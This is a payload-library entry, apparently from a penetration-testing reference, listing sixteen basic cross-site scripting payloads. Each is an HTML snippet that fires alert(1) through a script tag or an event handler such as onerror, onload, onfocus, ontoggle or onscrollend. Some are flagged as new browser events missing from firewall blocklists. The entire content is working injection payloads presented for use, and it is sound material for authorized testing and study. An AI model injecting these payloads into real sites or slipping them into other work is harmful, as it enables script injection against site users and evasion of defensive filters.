---
id: "xss-basic-payloads"
title: "XSS Payloads - Basic XSS Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "basic", "payload"]
difficulty: "beginner"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Simple, commonly used XSS payloads for initial testing

## Payloads

### Basic Alert

Most basic XSS payload using script tags

- **Contexts**: html
- **Severity**: high

```html
<script>alert(1)</script>
```

### Image OnError

Uses image tag with onerror event handler

- **Contexts**: html
- **Severity**: high

```html
<img src=x onerror=alert(1)>
```

### SVG OnLoad

SVG element with onload event

- **Contexts**: html
- **Severity**: high

```html
<svg onload=alert(1)>
```

### Input AutoFocus

Input element that automatically focuses and triggers XSS

- **Contexts**: html
- **Severity**: high

```html
<input autofocus onfocus=alert(1)>
```

### Body OnLoad

Body tag with onload event handler

- **Contexts**: html
- **Severity**: high

```html
<body onload=alert(1)>
```

### Iframe SrcDoc

Iframe with embedded HTML in srcdoc attribute

- **Contexts**: html
- **Severity**: high

```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

### Details/Summary

HTML5 details element with ontoggle event

- **Contexts**: html
- **Severity**: high

```html
<details ontoggle=alert(1)><summary>Click me</summary></details>
```

### Video OnError

Video element with onerror handler

- **Contexts**: html
- **Severity**: high

```html
<video><source onerror=alert(1)></video>
```

### Marquee OnStart

Marquee element with onstart event

- **Contexts**: html
- **Severity**: medium

```html
<marquee onstart=alert(1)>XSS</marquee>
```

### Form OnSubmit

Form with onsubmit event handler

- **Contexts**: html
- **Severity**: high

```html
<form onsubmit=alert(1)><input type=submit></form>
```

### Popover BeforeToggle

Popover API onbeforetoggle — works on hidden inputs (2024+)

- **Contexts**: html
- **Severity**: high

```html
<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>
```

### ScrollEnd Event

onscrollend fires when scroll completes — not in WAF blocklists

- **Contexts**: html
- **Severity**: high

```html
<div onscrollend=alert(1) style="overflow:auto;height:50px"><br><br><br><br></div>
```

### Content Visibility

content-visibility CSS triggers auto state change event

- **Contexts**: html
- **Severity**: high

```html
<div oncontentvisibilityautostatechange=alert(1) style="display:block;content-visibility:auto"></div>
```

### Dialog OnClose

Dialog element with onclose event handler

- **Contexts**: html
- **Severity**: high

```html
<dialog open onclose=alert(1)><form method=dialog><button>X</button></form></dialog>
```

### Search Element AutoFocus

New HTML search element with autofocus (2023+)

- **Contexts**: html
- **Severity**: high

```html
<search onfocus=alert(1) autofocus tabindex=0>test</search>
```

### Scroll Snap Change

CSS Scroll Snap event — Chrome 129+, brand new

- **Contexts**: html
- **Severity**: high

```html
<address onscrollsnapchange=alert(1) style="overflow-y:hidden;scroll-snap-type:x"><div style="scroll-snap-align:center">1337</div></address>
```
